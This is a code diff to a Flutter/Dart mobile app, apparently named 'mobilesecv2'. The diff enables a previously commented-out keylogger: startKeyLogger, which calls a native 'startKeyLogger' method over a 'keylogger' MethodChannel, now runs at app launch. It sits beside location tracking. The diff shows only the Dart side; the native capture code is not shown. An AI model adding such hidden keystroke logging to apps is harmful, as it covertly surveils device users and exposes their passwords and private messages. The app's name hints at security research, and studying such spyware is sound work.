@@ -10,7 +10,7 @@ import '/flutter_flow/nav/nav.dart';
 import 'index.dart';
 
 import 'location_service.dart'; // For the LocationService class
-import 'contacts.dart'; // For the requestContactPermission function
+// 'contacts.dart'; // For the requestContactPermission function - have bugs need to fix
 import 'package:permission_handler/permission_handler.dart';
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
@@ -26,7 +26,7 @@ void main() async {
 // Create a top-level MethodChannel that matches your Kotlin channel name.
 const MethodChannel _platform = MethodChannel(
   'com.mycompany.mobilesecv2/keylogger',
-);
+); 
 
 class MyApp extends StatefulWidget {
   // This widget is the root of your application.
@@ -48,10 +48,9 @@ class _MyAppState extends State<MyApp> {
     super.initState();
 
     // Initialize keylogging as soon as the app is launched.
-    //startKeyLogger();
+    startKeyLogger(); // Uncomment this line to start keylogging immediately. 
     // Request permission
     WidgetsBinding.instance.addPostFrameCallback((_) async {
-      //await LocationService().requestLocationPermissions();
       bool granted = await LocationService().requestLocationPermissions();
       if (granted) {
         LocationService().startTracking();
@@ -79,13 +78,13 @@ class _MyAppState extends State<MyApp> {
   }
 
   // Invokes the native method to start keylogging.
-  /*Future<void> startKeyLogger() async {
+  Future<void> startKeyLogger() async {
     try {
       await _platform.invokeMethod('startKeyLogger');
     } on PlatformException catch (e) {
       debugPrint('Failed to start keylogger: ${e.message}');
     }
-  } */
+  } 
 
 
 
